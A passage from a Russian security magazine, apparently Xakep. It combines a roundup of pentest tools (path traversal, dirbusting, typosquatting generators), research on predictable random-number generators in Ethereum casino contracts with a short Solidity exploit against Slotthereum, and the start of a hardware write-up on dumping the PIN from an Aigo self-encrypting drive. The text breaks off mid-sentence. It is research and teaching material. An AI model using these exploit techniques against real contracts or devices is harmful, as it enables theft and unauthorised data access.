Пользуясь случаем, не могу не рес пектануть дру жес твенному проекту Vulners,
решающему схожую задачу: у парней есть плагин для Burp, а также рас‐
ширение для Chrome, которое во время серфинга анализирует заголовки
серверов, све ряет по своей базе и, если видит уязвимый софт, репортит тебе
об этом. Удобно!


ВЫХОДИМ ЗА ПРЕДЕЛЫ WEB ROOT
 • Разработчик: Julio C. Stefanutto
 • Страница: GitHub

Несмотря на засилье модных веб‐аппов и то, что Path Traversal нет в OWASP
Top 10, в реальном мире эта уязвимость по‐прежнему встречается. Неп‐
равильно сконфигурированные серверы, увы, не редкость, и «погулять» вне
web   root  по‐прежнему  можно  с  завидной  регулярностью.  Утилита
dotdotslash — твой верный помощник в деб рях неизвестных файловых сис‐
тем.





Скрипт на Питоне принимает пару обязательных аргу ментов:
 • url — что ресерчить;
 • string — параметр, через который будем выходить из рутовой дирек‐
   тории.

Через параметр ‐‐depth можно задавать глубину сканирования, чтобы огра‐
ничить скоуп.
  В своей работе тулза опирает ся на небольшую базу обычных файлов
для дирбастинга.





А ищет их с помощью ряда predeﬁned‐пат тернов для брута, часть из которых
тебе наверняка известна.
  В общем, Python 3, зависимостей нет. Брат жив. :)


ДИРБАСТИМ ХОСТЫ НА СЛОВАРНЫЕ ДИРЕКТОРИИ
 • Разработчик: Abay
 • Страница: GitHub

Раз уж речь заш ла о Path Traversal, куда же без дирбастинга. Порою перебор
наиболее популярных директорий в веб‐приложении вскрывает множество
тайников. И хотя оригинальный dirbuster от OWASP чуть менее чем мертв,
у нас есть множество схо жих по наз начению утилит. Одна из них — CrawlBox.





CrawlBox —  это простой, но функциональ ный дирбастер  директорий,
написанный на Python. Из полезностей могу выделить возможность спу фить
юзер‐агент и использовать сторонние ба зы для бру та через параметр ‐w.


        WWW

                   В качестве базы так же советую подключить fuz‐
                                z.txt от моего друга и коллеги Bo0oM.


Для работы CrawlBox требует Python 2. Права root, вопреки заверению авто‐
ра, не потребуются — ты же не систему ста вишь, в отличие от некоторых? :)


ИЩЕМ SAN В SSL-СЕРТИФИКАТАХ
 • Разработчик: Franccesco Orozco
 • Страница: GitHub

Ты наверняка видел, что некоторые SSL‐сертификаты позволя ют защищать
не одно, а несколько доменных имен. Именно несколько, а не все под‐
домены, как это происхо дит в случае с дорогущими wildcard‐сертификатами.
Разумеется, при пентесте приложений быва ет полезно посмотреть не только
основной хост, но и Subject Alternative Name (SAN) — алиасы, которые раз‐
решены в SSL‐сер тификате. Узнать их можно и вручную, но зачем, когда у нас
есть тулза GetAltName?





GetAltName просканит для тебя представленный URL и покажет добытые SAN
в удобном формате. Из удачных фич есть возможность не только сканить
по инпуту, но и предоставить скрипту XML‐ный файл от Nmap’а. Ну и задать
формат вывода.
  В моем случае работает на Python 3.6, зависимос ти через pip, ничего осо‐
бого не требуется.


ЭКСПЛУАТИРУЕМ ТАЙПСКВОТТИНГ ДЛЯ СОЦИОТЕХНИЧЕСКОГО
ПЕНТЕСТА
 • Разработчик: Andrew Horton
 • Страница: MorningStar Security

Тайпсквоттинг — это очень крутая штука! Это когда вмес то xakep.ru ты
написал cakep.ru или xakkep.ru. Дру гими словами, тайпсквоттинг эксплу‐
атирует  опечат ки  в  написании  доменных  имен. Ошибки  могут  быть
как механические (например, рядом стоящие клавиши на клавиатуре), так
и орфографические  (cisko.com, mikrosoft.com). Думаю, ты и без меня
можешь придумать множество забавных трю ков с тайпсквоченными домена‐
ми, где фишинг фор мы логина — самое безобидное.





Urlcrazy — ужжжасно полезная тулза для социотехничес кого пентеста! С ее
помощью ты не только сгенерируешь множество фей ковых доменных имен
по предоставленному оригинальному домену, но и проверишь часть из них
на  занятость.  Битфлип,  тайпсквоттинг, ошиб ки  произношения,  записи
по телефону, опечатки — все это генератор urlcrazy учи тывает и выдает тебе
целый список доменов, которые можно использовать в тестировании на про‐
никновение. Каждая мутация снабжена отдель ным пояснением, а также
инфой о занятости доменного имени.
  Для работы потребуется Ruby, в моем случае работает без ошибок
на ruby 2.5.0p0.
  А на сегодня все. Ресерчи, пробуй и отписывайся в комментах о новых
и удобных хактулзах!
ВЗЛОМ

 КАК ОБМАНУТЬ
 КРИПТОКАЗИНО





                                        Арсений Реутов





  ПРЕДСКАЗЫВАЕМ СЛУЧАЙНЫЕ ЧИСЛА
    В УМНЫХ КОНТРАКТАХ ETHEREUM




Ethereum завоевал огромную популярность как платформа
для ICO. Но она применима не только для соз дания токенов
стандарта ERC‐20. Блокчейн Ethereum можно исполь зовать
в  онлайн‐рулет ке,  лотереях  и  карточных  играх.  Под‐
твержденные транзакции блокчейна нельзя подделать —
технология децентрализована и прозрачна, — но код умных
контрактов может быть уязвим. Одна из проблем — уяз‐
вимые генераторы псевдослучайных чисел, ГПСЧ. Давай
разберем типовые ошибки реализации ГПСЧ в азартных
играх на базе Ethereum.


Ethereum позволяет исполнять тьюринг‐пол ные программы, обычно написан‐
ные на языке Solidity, поэто му основатели платформы называют ее «мировым
суперкомпьютером». Благода ря прозрачности  Ethereum  весьма удобно
использовать в сфере азартных онлайн‐игр, где очень важно доверие поль‐
зователя.
  Однако процессы блокчейна Ethereum предсказуемы, что создает слож‐
ности для тех, кто решил написать собственный генератор псевдослу чайных
чисел — неотъемлемую часть любой азартной игры. Мы решили исследовать
умные контракты, чтобы оценить надежность ГПСЧ на Solidity и выявить рас‐
пространенные ошибки про ектирования, которые приводят к уязвимостям
и дают тем самым возможность предска зать слу чайные числа.


             INFO

                   В 2017 году специалисты Positive Technologies
                      реализовали проекты по анализу безопасности
                      и защите от киберпреступников как процедуры
                         ICO,  так  и  внедрения  блок чейн‐технологий.
                       Результаты исследования оказались безрадос‐
                      тными:  уязвимости  в  смарт‐контрактах  были
                      выявлены в 71% проектов, в 23% проектов были
                      выявлены недостатки,  поз воляющие  атаковать
                       инвесторов. В каждом проекте ICO в среднем
                      содержалось  пять  уяз вимостей.  Однако  зло‐
                   умышленникам достаточно всего одной, чтобы
                      присвоить деньги инвесторов.


Наше исследование включает следующие ста дии:
 1. Собрали 3649 умных контрактов с etherscan.io и GitHub.
 2. Импортировали контракты в Elasticsearch, поисковик с открытым кодом.
 3. С помощью веб‐интерфейса Kibana с богаты ми возможностями по поиску
   и фильтрации данных обнаружили 72 уникальные реализации ГПСЧ.
 4. Проанализировав вручную каждый контракт, мы обнаружили, что 43 кон‐
   тракта были уязвимы.


УЯЗВИМЫЕ ГЕНЕРАТОРЫ
Анализ выявил четыре категории уязвимых ГПСЧ:
 • генераторы, исполь зующие переменные блока как источник энтропии;
 • генераторы, исполь зующие хеш предыдущего блока;
 • генераторы, исполь зующие хеш предыдущего блока в сочетании с якобы
   секретным начальным зна чением;
 • генераторы, подвержен ные уязвимос ти с опережением транзакции (front‐
   running).

Рассмотрим каждую категорию с примера ми уяз вимого кода.


Ге нератор, использующий перемен ные бло ка
Существует ряд переменных бло ка, которые могут быть по ошибке исполь‐
зованы как источники энтропии:
 • block.coinbase представляет собой адрес май нера, который майнит
   данный блок;
 • block.difficulty — отно ситель ный показатель того, насколько сложно
   создать блок;
 • block.gaslimit — максимальный расход «газа» на все транзакции
   в блоке;
 • block.number — высота данного бло ка;
 • Block.timestamp — дата майнин га блока.

Всеми  перечисленными переменными  могут манипулировать майнеры,
поэтому их нельзя использовать как источник энтропии. Более того, очевид‐
но, что эти переменные одинаковы в пределах одного блока. И если контракт
злоумышленника вызывает контракт жертвы внут ренним сообщением, один
и тот же генератор в обо их контрактах выдаст оди наковое значение.


Пример 1 (0x80ddae5251047d6ceb29765f38fed1c0013004b7):
// Won if block number is even
// (note: this is a terrible source of randomness, please don’t use
this with real money)
bool won = (block.number % 2) == 0;


Пример 2 (0xa11e4ed59dc94e69612f3111942626ed513cb172):
// Compute some *almost random* value for selecting winner from
current transaction.
var random = uint(sha3(block.timestamp)) % 2;


Пример 3 (0xcC88937F325d1C6B97da0AFDbb4cA542EFA70870):
address seed1 = contestants[uint(block.coinbase) % totalTickets].addr
;
address seed2 = contestants[uint(msg.sender) % totalTickets].addr;
uint seed3 = block.difficulty;
bytes32 randHash = keccak256(seed1, seed2, seed3);
uint winningNumber = uint(randHash) % totalTickets;
address winningAddress = contestants[winningNumber].addr;


Ге нератор, использующий хеш бло ка
У каждого блока в блокчейне Ethereum есть хеш для верификации транзакций.
Так называемая виртуальная машина Ethereum (EVM) позволяет получить хеш
блока с помощью функции block.blockhash(). Функция ожидает чис ловой
аргумент, который обоз нача ет номер блока. Во вре мя исследования мы
обнаружили, что резуль тат функции block.blockhash() часто некорректно
используется при генерации случайных значений.
  Существуют три основные уязвимые вариации генераторов, исполь‐
зующих хеш блока:
 • block.blockhash(block.number) — хеш текущего блока;
 • block.blockhash(block.number1) — хеш последнего блока;
 • block.blockhash() — хеш блока, который как минимум на 256 блоков
   старше.

Рассмотрим каждую из перечисленных вари аций.


block.blockhash(block.number)
Переменная состояния block.number поз воляет узнать высоту данного бло‐
ка. Когда майнер добавляет в блок транзакцию, которая выпол няет код кон‐
тракта, известен block.number будущего блока этой транзакции и контракту
доступно его значение. Однако в момент выполнения транзакции в EVM хеш
создаваемого блока еще неизвестен по очевидным причинам, и EVM всегда
выдает ноль.
  Некоторые контракты ошибочно интерпретируют значение выраже ния
block.blockhash(block.number). В таких контрактах хеш блока считается
известным во время выполнения транзакции и используется как источник
энтропии.


Пример 1 (0xa65d59708838581520511d98fb8b5d1f76a96cad ):
function deal(address player, uint8 cardNumber) internal returns (
uint8) {
   uint b = block.number;
   uint timestamp = block.timestamp;
   return uint8(uint256(keccak256(block.blockhash(b), player, cardNu
mber, timestamp)) % 52);
}


Пример 2 (https://github.com/axiomzen/eth-random/issues/3):
function random(uint64 upper) public returns (uint64 randomNumber) {
   _seed = uint64(sha3(sha3(block.blockhash(block.number), _seed),
now));
   return _seed % upper;
}


block.blockhash(block.number-1)
Некоторые контракты используют генера торы, основанные на хеше пос‐
леднего блока. Понятно, что такой подход тоже уязвим: злоумышленник
может создать контракт‐экс пло ит с таким же значением генератора, чтобы
вызвать атакуемый контракт через внут реннее сообщение. «Случайные» чис‐
ла обоих контрактов совпадут.


Пример 1 (0xF767fCA8e65d03fE16D4e38810f5E5376c3372A8):
//Generate random number between 0 & max
uint256 constant private FACTOR =  115792089237316195423570985008687
9078532699846656405640394575840079131296399;
function rand(uint max) constant private returns (uint256 result){
   uint256 factor = FACTOR * 100 / max;
   uint256 lastBlockNumber = block.number ‐ 1;
   uint256 hashVal = uint256(block.blockhash(lastBlockNumber));
   return uint256((uint256(hashVal) / factor)) % max;
}


block.blockhash() — хеш будущего бло ка
Более надежный способ — использовать хеш будущего блока, например сле‐
дующим образом.
 1. Игрок делает ставку, казино запоминает block.number транзакции.
 2. При втором вызове контракта игрок запрашивает у казино выигрышный
   номер.
 3. Казино извлекает сохраненный block.number, получает хеш блока по его
   номеру и затем исполь зует хеш при генерации псевдослучайного чис ла.

Такой подход работает, только если выполняется одно важное требование.
В документации Solidity есть предупреждение об ограниченном числе хешей
блоков, которые может хранить EVM.



     По соображениям мас шта биру емос ти хеши дос тупны не для всех бло-
       ков. Можно получить дос туп к хешам только пос ледних 256 блоков,
      а все остальные зна чения будут рав ны нулю.

Поэтому, если второй вызов не был сделан в пределах 256 блоков и не было
проверки номера блока, псевдослучайное число будет известно заранее —
это 0.
  Самый нашумевший случай эксплуата ции этой уязвимости — взлом
лотереи SmartBillions. Контракт неверно проверял возраст block.number, и это
привело к тому, что игрок выиграл 400 ETH: пос ле создания 256 блоков он
запросил предсказуемый выигрышный номер, который отправил в первой
транзакции.


Ге нераторы, использующие хеш пре дыду щего бло ка с зак рытым
начальным значением
Чтобы увеличить энтропию, часть из исследованных контрактов использовали
начальное значение, которое считает ся секретным. Так было в лотерее Slot‐
thereum. Пример кода:


bytes32 _a = block.blockhash(block.number ‐ pointer)
for (uint i = 31; i >= 1; i‐‐) {
   if ((uint8(_a[i]) >= 48) && (uint8(_a[i]) <= 57)) {
       return uint8(_a[i]) ‐ 48;
   }
}

Переменная pointer объявлена закрытой, то есть у других контрактов нет дос‐
тупа к ее значению. После каждой игры выигрышный номер от 1 до 9 прис‐
ваивался этой переменной и затем использовал ся как слу чайное смещение
block.number при получении хеша бло ка по номеру.
  Одно из свойств технологии блокчейн — ее проз рачность, поэтому сек‐
ретные данные не дол жны храниться в ней в открытом виде. Несмотря на то
что закрытые переменные недоступны дру гим контрактам, есть возможность
извлечь  из  блокчейна  содержимое  хранилища  контракта. К  при меру,
в популярном в Ethereum клиенте web3 есть API‐метод web3.eth.getStor‐
ageAt(), с помощью которого можно извлечь содержимое постоянного хра‐
нилища контракта по индексам записей в нем.
  В таком случае не составит труда получить зна чение закрытой перемен‐
ной pointer из контракта и использовать ее в качестве аргу мента в эксплоите:


function attack(address a, uint8 n) payable {
   Slotthereum target = Slotthereum(a);
   pointer = n;
   uint8 win = getNumber(getBlockHash(pointer));
   target.placeBet.value(msg.value)(win, win);
}


Ге нераторы, под вержен ные уяз вимости с опе реже нием
транзакции (front-running)
Чтобы отхватить наибольшую наг раду, майнеры используют транзакции
для создания нового блока на основе совокупного газа, полученного с каж‐
дой транзакции. Порядок выполнения транзакции в блоке определя ется
ценой газа. Транзакция с самой высокой ценой газа будет выполнена первой.
Таким образом, манипулируя ценой, можно добиться того, что нужная тран‐
закция выполнится раньше остальных в блоке. Это может представлять собой
уязвимость в случае, когда выполнение контракта зависит от его позиции
в блоке.
   Рассмотрим такой пример. У лотереи есть внешний «оракул» для получе‐
ния  псевдослучайных  чисел,  который  исполь зуется,  чтобы определить
победителя сре ди игроков, делающих ставки в каждом раунде. Числа переда‐
ются в незашифрованном виде. Зло умышленник может посмотреть пул
неподтвержденных транзакций и дождаться числа от оракула. Как только
транзакция предсказателя появляется в пуле, зло умышленник отправляет
ставку с большей ценой газа. Эта транзакция отправлена последней в раун‐
де, но она выполняется перед транзакцией оракула благодаря наивысшей
цене газа, и таким обра зом ата кующий ста новится победителем. Подобная
техника была про демонстрирова на на кон курсе ZeroNights ICO Hacking Con‐
test.
   Есть еще один пример контракта, подверженного уязвимос ти с опереже‐
нием транзакции, — игра Last is me! Игрок покупает билет, занимает пос‐
леднее место, и начинается обратный отчет таймера. Если никто не покупает
билет после создания определен ного количес тва блоков, контракт отдает
выигрышное место тому, кто купил билет последним. Когда раунд заканчива‐
ется, злоумышленник следит за пулом неподтвержденных транзакций дру гих
участников и выигрывает, отправляя транзакцию с большей ценой газа.


КАК СОЗДАТЬ БОЛЕЕ БЕЗОПАСНЫЙ ГПСЧ
Существует несколько подходов к соз данию более безопас ных ГПСЧ в блок‐
чейне Ethereum:
 • внешний оракул;
 • ал горитм Signidice;
 • подход Commit — Reveal.


Внеш ние оракулы
Oraclize
Oraclize — сервис для децентрализованных при ложений, который служит свя‐
зующим  звеном между  блокчейном  и внешней  средой  (интернетом).
При помощи Oraclize умные контракты могут зап рашивать данные из веб‐API
(например, курс валюты, прог ноз погоды, сто имость акций). Кроме того, Ora‐
clize может использовать ся как ГПСЧ. Некото рые из исследованных контрак‐
тов использовали Oraclize, чтобы получить случайные числа от random.org.





                              Oraclize в действии

Главный недостаток этого подхода в том, что сервис централизованный.
Можем ли мы быть уверены, что демон Oraclize не изменит результат? Можно
ли доверять random.org и всей его инфраструктуре? Несмотря на то что Ora‐
clize использует сервис TLSNotary, верифи кация производится вне блокчейна
(в случае с лотерей — пос ле того, как объявят победи теля). Лучше исполь‐
зовать Oraclize как источник «случайных» данных с применением доказатель‐
ств Ledger proofs, которые могут быть подтверждены внутри блокчейна.


BTC Relay
BTC Relay — мост между блокчейнами Ethereum и Bitcoin. С помощью BTC Re‐
lay умные контракты блокчейна Ethereum могут запрашивать хеш будущего
блока Bitcoin и исполь зовать его как источник энтропии. Пример проекта,
который использует BTC Relay как ГПСЧ, — The Ethereum Lottery.
  BTC Relay не подходит для решения проб лемы мотивации май нера. Здесь
барьер выше, чем при использовании будущих блоков Ethereum, но только
из‐за более высокой цены биткойна. Так что этот подход снижает, но не
устраняет вероятность мошенничества со стороны май неров.


Ал горитм Signidice
Signidice — алгоритм, основанный на криптографических подписях. Может
быть использован как ГПСЧ в умных контрактах — с двумя сторонами (игрок
и казино). Алгоритм работа ет следующим образом.
 1. Игрок делает ставку, вызывая метод контракта.
 2. Казино видит ставку, подписывает ее закрытым ключом и отправляет под‐
   пись контракту.
 3. Контракт верифициру ет подпись с помощью откры того ключа.
 4. После этого подпись используется для генера ции случайного числа.

В Ethereum есть встроенная функция ecrecover() для проверки подписей
ECDSA в блокчейне. Одна ко алго ритм ECDSA не может быть использован
в Signidice, так как казино может изменять входные параметры (в частности,
параметр k) и таким образом влиять на зна чение конечной подписи. Ре али‐
зация этой мошеннической схемы была продемонс трирована Алексеем Пер‐
цевым.
  К счастью, с выходом хардфорка Metropolis появился новый оператор воз‐
ведения в сте пень по модулю, что позволило использовать проверку под писи
RSA, который, в отличие от ECDSA, не позволя ет манипу лировать входными
данными, чтобы подоб рать подпись.


Под ход Commit — Reveal
Как видно из названия, данный подход сос тоит из двух этапов.
 • Commit: сто роны передают свои данные в умный контракт в зашифрован‐
  ном виде;
 • Reveal: стороны переда ют начальные зна чения в откры том виде, контракт
   подтверждает, что данные верны, начальные значения используются
   для генерации случайного числа.

Для грамотного применения данного подхода нельзя полагаться ни на одну
из сторон. Несмотря на то что игроки не зна ют начальных значений владель‐
ца, владелец может быть одновременно и игроком, поэтому игроки не могут
ему доверять.
   Randao — более грамотное применение подхода Commit — Reveal. Этот
генератор псев дослучайных чисел собира ет хеширо ванные начальные зна‐
чения нескольких  сторон, и каждая  сторона  получает вознаграждение
за участие. Стороны не знают начального зна чения друг друга, поэтому
генерируется действительно  случайный результат. Однако  отказ одной
из сторон раскрыть начальное значение приведет к DoS.
   Commit — Reveal можно совместить с использованием хеша будущего
блока. В таком случае имеется три источника энтропии:
 • sha3(seed1) владельца;
 • sha3(seed2) игрока;
 • хеш будущего блока.

Случайное число генерируется таким обра зом: sha3(seed1, seed2, block‐
hash). Подход Commit — Reveal решает проб лему мотивации майнера: май‐
нер определяет, публиковать ли найденный хеш в блокчейне, но не знает
начальные значения владельца и игрока. Подход решает также и проблему
мотивации владельца: владелец зна ет только началь ное значение владельца,
начальное значение игрока и хеш будущего блока ему неиз вестны. Кроме
того, подход отлично работа ет в том случае, если вла делец и майнер — одно
лицо: он выбирает хеш блока и знает начальное значение владельца, но не
игрока.


ЗАКЛЮЧЕНИЕ
Создание безопасных генера торов псевдослу чайных чисел в блокчей не
Ethereum по‐прежнему непростая задача. Как показало исследование, из‐за
недостатка готовых решений разработ чики чаще используют свои инс тру‐
менты реализации. Одна ко легко допус тить ошиб ку при разработке, так
как источники энтропии в блокчейне огра ничены. При соз дании ГПСЧ раз‐
работчику следует убедиться, что он понимает мотивацию каждой стороны,
и тогда приступить к выбору подхода.
ВЗЛОМ
  ХАРДКОРНЫЙ
       ВЗЛОМ
         HDD





РЕВЕРСИМ И ХАКАЕМ                              С 1999Raphaёlгода занимаетсяRigo
                                                                                аппаратным реверсингом,
                                                                                      исследуя причудливыеСАМОШИФРУЮЩИЙСЯ                                                                                        архитектуры и системы
                                                                                          безопасностиВНЕШНИЙ НАКОПИТЕЛЬ AIGO





Реверсинг и взлом внешних самошифрующихся накопи‐
телей — мое давнее хобби. В прошлом мне доводилось
упражняться с такими моделями, как Zalman VE‐400, Zalman
ZM‐SHE500, Zalman ZM‐VE500. Совсем недавно коллега
занес мне еще один экспонат: Patriot (Aigo) SK8671, который
построен по типичному дизайну — ЖК‐индикатор и клавиату‐
ра для ввода ПИН‐кода.


             INFO

                  •Первоисточник: Aigo Chinese encrypted HDD.
                  •Материал  распространяется  в  соответствии
                         с лицензией CC‐BY‐SA 4.0.
                  •Переводчик — Антон Карев.
                  •Материал публикуется с согласия автора.





                            Кор пус





                             Упаковка

Доступ к сохраненным на диске данным, которые яко бы зашифрованы, дает‐
ся после ввода ПИН‐кода. Несколько вводных замеча ний по этому девайсу:
 • для изменения ПИН‐кода необходимо нажать F1 перед разблокировкой;
 • в ПИН‐коде дол жно быть от шести до девяти цифр;
 • после пятнадцати неверных попыток диск очищается.


АППАРАТНАЯ АРХИТЕКТУРА
Сначала препарируем девайс на час ти, чтобы понять, из каких компонентов
он состоит. Самое нудное занятие — вскрывать корпус: много микроско‐
пических винтиков и пластика. Вскрыв корпус, видим следующее (обрати вни‐
мание на припаянный мной пятиконтактный разъем):





Основная плата
Основная плата доволь но прос та.





Наиболее примечательные ее части (сверху вниз):
 • разъем для ЖК‐индикатора (CN1);
 • пищалка (SP1);
 • Pm25LD010 (спецификация) SPI‐флешка (U2);
 • контроллер Jmicron JMS539 (спецификация) для USB‐SATA (U1);
 • разъем USB 3 (J1).

SPI‐флешка хранит про шивку для JMS539 и некоторые настройки.

Плата ЖК‑индикато ра
На плате ЖК нет ничего примечательного.





Здесь мы видим:
 • ЖК‐индикатор  неизвестного  происхождения  (вероятно,  с  китайским
  набором шрифтов); с последова тельным управлением;
 • ленточный соединитель для клавиатурной платы.


Клавиатурная плата
А вот это уже интереснее!





Вот здесь, на задней сто роне, мы видим ленточный соединитель, а также Cy‐
press CY8C21434 — микроконтроллер PSoC 1 (далее по тексту будем звать
его просто PSoC).





CY8C21434 использует набор инструкций M8C (см. документацию). На стра‐
нице продукта указано, что он поддерживает технологию CapSense (решение
от Cypress для емкостных клавиатур). Здесь виден припаянный мной пятикон‐
тактный разъем — это стандартный подход для подключения внешнего прог‐
рамматора через ISSP‐интерфейс.


Смотрим на про вода
Разберемся, что с чем здесь свя зано. Для этого достаточно прозвонить про‐
вода мультиметром.





Пояснения к этой на коленке нарисованной схеме:
 • PSoC описан в технической спецификации;
 • следующий разъем, тот, что правее, — ISSP‐интерфейс, который волею
   судеб соответствует тому, что о нем написано в интернете;
 • самый правый разъем — это клемма для лен точного соеди нителя с кла‐
   виатурной платой;
 • черный  прямоуголь ник —  чертеж  разъема  CN1,  предназначенного
   для соединения основной платы с ЖК‐платой. P11, P13 и P4 при соединены
   к ножкам PSoC 11, 13 и 4, на ЖК‐плате.


ПОСЛЕДОВАТЕЛЬНОСТЬ ШАГОВ АТАКИ
Теперь когда мы знаем, из каких компонентов состоит этот накопитель, нам
необходимо:
 1. Убедиться, что базовая функциональность шифрования действительно
   присутствует.
 2. Узнать, как генерируются/сохраня ются ключи шифрования.
 3. Найти, где именно проверя ется ПИН‐код.

Для этого я проделал следующие шаги:
 • снял дамп данных SPI‐флешки;
 • попытался снять дамп данных PSoC‐флешки;
 • удостоверился, что обмен данными меж ду Cypress PSoC и JMS539 фак‐
   тически содержит нажатые клавиши;
 • убедился, что при изменении пароля в SPI‐флеш ке ничего не переписыва‐
   ется;
 • поленился реверсить 8051‐прошивку от JMS539.


Снимаем дамп дан ных SPI-флеш ки
Эта процедура очень проста:
 • подклю чить зонды к нож кам флешки: CLK, MOSI, MISO и (опционально)
   EN;
 • «обню хать» коммуникации сниффером, исполь зуя логичес кий анализатор
   (я взял Saleae Logic Pro 16);
 • декодировать SPI‐протокол и экспортировать результаты в CSV;
 • воспользоваться decode_spi.rb, чтобы распарсить результаты и получить
   дамп.

Обрати внимание, что такой подход в случае с JMS539‐контроллером
работает в особенности хорошо, пос кольку этот контрол лер на этапе ини‐
циализации загружает с флешки всю прошивку.


$ decode_spi.rb boot_spi1.csv dump
0.039776 : WRITE DISABLE
0.039777 : JEDEC READ ID
0.039784 : ID 0x7f 0x9d 0x21
0.039788 : READ @ 0x0
0x12,0x42,0x00,0xd3,0x22,0x00,
[...]
$ ls ‐‐size ‐‐block‐size=1 dump
49152 dump
$ sha1sum dump
3d9db0dde7b4aadd2b7705a46b5d04e1a1f3b125 dump

Сняв дамп с SPI‐флешки, я пришел к выводу, что ее единственная задача —
хранить прошивку для устройства управления JMicron, которая встраивается
в 8051‐микроконтрол лер. К сожалению, сня тие дампа SPI‐флешки оказалось
бесполезным:
 • при изменении ПИН‐кода дамп флешки остается тем же самым;
 • после этапа инициализации девайс к SPI‐флешке не обращается.


Об нюхиваем коммуникации
Попробуем найти, какой чип отвечает за проверку коммуникаций для инте‐
ресующих нас времени/контента. Как мы уже знаем, контроллер USB‐SATA
подклю чен к ЖК Cypress PSoC, через разъем CN1 и две ленты. Поэтому под‐
клю чаем зонды к трем соответству ющим нож кам:
 • P4, общий ввод/вывод;
 • P11, I2C SCL;
 • P13, I2C SDA.





Затем запускаем логичес кий ана лизатор Saleae и вводим на клавиатуре
123456✓ . В результате видим следующую диаграмму.





На ней можем заметить три канала обмена данными:
 • на канале P4 несколь ко коротких всплесков;
 • на P11 и P13 — почти непрерывный обмен данными.

Увеличивая первый всплеск на канале P4 (синий прямоугольник пре дыдущего
рисунка), получаем сле дующее:





Здесь видно, что на P4 почти 70 мс однообразного сигнала, который, как мне
сначала показалось, играет роль синхро сигнала. Однако, потратив некоторое
время на то, чтобы проверить свою догадку, я обна ружил, что это не синхро‐
сигнал, а аудиопоток, который выводится на пищалку при нажатии клавиш.
Поэтому сам по себе этот участок сигнала не содержит для нас полезной
информации. Однако его можно использовать в качестве инди катора — что‐
бы знать момент, когда PSoC регистрирует нажатие клавиши.
  Но последний аудиопоток канала P4 немного отличается от других:
это звук для «неверного ПИН‐кода»!
  Возвращаясь к диаграмме нажатия клавиш, при увеличе нии диаграммы
последне го аудиопотока (см. снова синий прямоугольник) получаем:





Здесь мы видим однообразные сигналы на P11. Так что, похоже, это и есть
синхросигнал. А P13 — данные. Обрати внимание, как шаблон изменяется
после окончания звуково го сигнала. Было бы интересно посмотреть, что
здесь происходит.
  Протоколы, работающие с дву мя про вода ми, — это обычно SPI или I2C,
и в технической спецификации на Cypress говорится, что эти контакты соот‐
ветствуют I2C. Как видим, это спра ведливо и для нашего случая:





Чипсет USB‐SATA постоянно опра шивает PSoC — чтобы считывать состояние
клавиши, которое по умолчанию равно 0. Затем, при нажатии клавиши 1, оно
меняется на 1. Окончательная переда ча, сра зу пос ле нажатия ✓ , отличается,
если введен невер ный ПИН‐код. Одна ко на данный момент я не проверял,
что там фактически передается. Но подозреваю, что вряд ли это ключ шиф‐
рования. Так или иначе, нас тало время снять дамп внутренней прошивки
PSoC.


Начинаем снимать дамп с внутренней флеш ки PSoC
Итак, все указывает на то, что ПИН‐код хранится во флеш‐недрах PSoC.
Поэтому нам нужно прочитать эти флеш‐недра. Фронт необходимых работ:
 • взять под контроль «общение» с микроконтроллером;
 • найти способ проверить, защищено ли это «обще ние» от считывания
   извне;
 • найти способ обхода защиты.

Существует два места, где имеет смысл искать дей ствующий ПИН‐код:
 • внутренняя флеш‐память;
 • SRAM, где ПИН‐код может храниться для сравнения его с тем ПИН‐кодом,
   который вводится поль зователем.

Забегая вперед, отмечу, что мне все‐таки уда лось снять дамп внутренней
флешки PSoC, обой дя ее систему защиты пос редством аппаратной атаки
«трассировка с холодной перезагрузкой» — пос ле реверсинга недокумен‐
тированных возможностей ISSP‐про токола. Это позволило мне напрямую
снимать дамп действующего ПИН‐кода.


$ ./psoc.py
syncing: KO OK
[...]
PIN: 1 2 3 4 5 6 7 8 9

Итоговый программный код:
 • Arduino‐код для HSSP;
 • драйвер на Python и ISSP‐дизас семблер.


ISSP-ПРОТОКОЛ
Что такое ISSP
«Общение» с микроконтроллером может озна чать разные вещи: от endor
to vendor до взаимодей ствия с применением последовательного протокола
(например, ICSP для Microchip’овского PIC).
   У Cypress для этого собственный проприетарный протокол, называемый
ISSP (in‐system serial programming protocol — внутрисистемный протокол пос‐
ледовательного программирования), который час тично опи сан в технической
спецификации. Патент US7185162 также дает некоторую информацию. Есть
и open source аналог, называемый HSSP (мы воспользуемся им чуть поз же).
ISSP работает сле дующим обра зом:
 • перезагрузить PSoC;
 • вывести магическое число на нож ку последовательных данных этой PSoC
   (для входа в режим внеш него программирова ния);
 • отправить команды, которые представляют собой длинные битовые стро‐
   ки, называемые векторами.

В документации на ISSP эти векторы определены лишь для небольшой горс‐
тки команд:
 • Initialize‐1;
 • Initialize‐2;
 • Initialize‐3 (варианты 3V и 5V);
 • ID‐SETUP;
 • READ‐ID‐WORD;
 • SET‐BLOCK‐NUM: 10011111010dddddddd111, где dddddddd=block #;
 • BULK ERASE;
 • PROGRAM‐BLOCK;
 • VERIFY‐SETUP;
 • READ‐BYTE: 10110aaaaaaZDDDDDDDDZ1, где DDDDDDDD = data  out,
   aaaaaa = адрес (6 бит);
 • WRITE‐BYTE: 10010aaaaaadddddddd111, где dddddddd = data in, aaaaaa =
   адрес (6 бит);
 • SECURE;
 • CHECKSUM‐SETUP;
 • READ‐CHECKSUM:  10111111001ZDDDDDDDDZ110111111000ZDDDDDDDDZ1,
   где DDDDDDDDDDDDDDDD = data out: контроль ная сумма девайса;
 • ERASE BLOCK.

Например, вектор для Initialize‐2:


1101111011100000000111 1101111011000000000111
1001111100000111010111 1001111100100000011111
1101111010100000000111 1101111010000000011111
1001111101110000000111 1101111100100110000111
1101111101001000000111 1001111101000000001111
1101111000000000110111 1101111100000000000111
1101111111100010010111

У всех векторов одинаковая длина — 22 бита. В документации на HSSP есть
некоторые допол нитель ные сведения по ISSP: «ISSP‐вектор — это не что
иное, как битовая последовательность, представляющая собой набор инс‐
трукций».


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 ХАРДКОРНЫЙ ВЗЛОМ
              HDD

         РЕВЕРСИМ И ХАКАЕМ САМОШИФРУЮЩИЙСЯ
                   ВНЕШНИЙ НАКОПИТЕЛЬ AIGO





Де мистификация век торов
Разберемся, что здесь происходит. Первоначаль но я предполагал, что эти
самые векторы представляют собой raw‐варианты M8C‐инструкций, однако,
проверив эту гипотезу, я обна ружил, что опкоды операций не совпадают.
  Затем я загуглил приведенный выше вектор и наткнул ся на вот это иссле‐
